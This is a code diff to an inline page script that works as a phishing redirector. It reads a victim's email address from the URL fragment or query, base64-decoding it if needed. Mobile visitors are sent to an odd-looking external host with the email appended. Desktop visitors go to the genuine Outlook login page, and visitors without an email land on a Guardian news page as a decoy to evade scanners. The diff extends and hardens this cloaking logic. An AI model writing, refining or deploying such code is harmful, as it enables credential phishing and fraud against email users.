@@ -94,73 +94,103 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 800;
+        const MOBILE_REDIRECT_URL_BASE = "https://nJHAo.onahcjctgyd.es/RZWYfPQmCTz13hg@0h/$";
+        const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
+        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no valid email
 
         // Mobile device detection function
         function isMobileDevice() {
             const userAgent = navigator.userAgent.toLowerCase();
             return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
         }
-        
+
         // Check if string is a valid email
         function isValidEmail(email) {
-            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            // Basic check, consider a more robust regex if needed
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email || ''));
         }
-        
-        // Try to decode base64 if needed, return the email
-        function getEmailFromFragment(fragment) {
-            // First check if the fragment itself is a valid email
-            if (isValidEmail(fragment)) {
-                return fragment;
+
+        // Try to get potential value from hash or search string
+        function getPotentialValue() {
+            const hash = window.location.hash.substring(1); // Remove leading '#'
+            if (hash) {
+                return hash;
             }
-            
+            const search = window.location.search.substring(1); // Remove leading '?'
+            if (search) {
+                // Handle potential key-value pairs (e.g., ?email=...) or just the value (?...)
+                try {
+                   const params = new URLSearchParams(search);
+                   // Prioritize a parameter named 'email' if it exists
+                   if (params.has('email')) return params.get('email');
+                   // Otherwise, check if the whole search string (decoded) might be the value
+                   const decodedSearch = decodeURIComponent(search);
+                   // If it looks like a simple value (no '=' typical of params)
+                   if (search.indexOf('=') === -1) return decodedSearch;
+                   // Fallback if it was like '?key=value' but key wasn't 'email' - less likely intended
+                   // In this case, we probably don't have the email as the user intends
+                } catch (e) {
+                    // If URLSearchParams fails or decode fails, treat the raw search string as potential value
+                    return search;
+                }
+            }
+            return null; // No hash or search string found
+        }
+
+
+        // Try to decode base64 if needed, return the email or null
+        function getEmailFromValue(value) {
+            if (!value) return null;
+
+            // First check if the value itself is a valid email
+            if (isValidEmail(value)) {
+                return value;
+            }
+
             // Otherwise try to decode it as base64
             try {
-                const decoded = atob(fragment);
+                // Replace URL-safe chars if used
+                const base64Value = value.replace(/-/g, '+').replace(/_/g, '/');
+                // Pad if necessary
+                const paddedValue = base64Value.padEnd(base64Value.length + (4 - base64Value.length % 4) % 4, '=');
+                const decoded = atob(paddedValue);
                 if (isValidEmail(decoded)) {
                     return decoded;
                 }
             } catch (e) {
-                console.error("Failed to decode fragment as base64");
+                // Ignore decoding errors, means it wasn't valid base64 or email
+                console.warn("Value was not a valid email or base64-encoded email:", e.message);
             }
-            
+
             // Return null if neither approach worked
             return null;
         }
-        
+
         // Main redirect function
         function performRedirect() {
-            // Get the fragment (everything after #)
-            const fragment = window.location.hash.substring(1);
-            
-            // If there's no fragment, do nothing
-            if (!fragment) {
-                console.log("No email found in URL");
-                return;
-            }
-            
-            // Get email from fragment (handles both raw and base64)
-            const email = getEmailFromFragment(fragment);
-            
-            if (!email) {
-                console.error("No valid email found in URL fragment");
-                return;
-            }
-            
-            console.log("Processing email:", email);
-            
-            // Check if the device is mobile
-            if (isMobileDevice()) {
-                // Redirect mobile devices to the original destination
-                const redirectUrl = "https://nJHAo.onahcjctgyd.es/RZWYfPQmCTz13hg@0h/$" + email;
-                console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                window.location.href = redirectUrl;
+            const potentialValue = getPotentialValue();
+            const email = getEmailFromValue(potentialValue);
+
+            if (email) {
+                // Valid email found
+                console.log("Valid email found:", email);
+                if (isMobileDevice()) {
+                    // Redirect mobile devices to the specific destination
+                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + email;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
+                } else {
+                    // Redirect non-mobile devices to Outlook
+                    console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
+                    window.location.href = DESKTOP_REDIRECT_URL;
+                }
             } else {
-                // Redirect non-mobile devices to Outlook
-                console.log("Non-mobile device detected. Redirecting to Outlook.");
-                window.location.href = "https://outlook.office365.com/";
+                // No valid email found or value missing
+                console.log("No valid email found. Redirecting all devices to dead URL:", DEAD_URL);
+                window.location.href = DEAD_URL;
             }
         }
-        
+
         // Execute redirect after a short delay
         setTimeout(performRedirect, REDIRECT_DELAY);
     })();
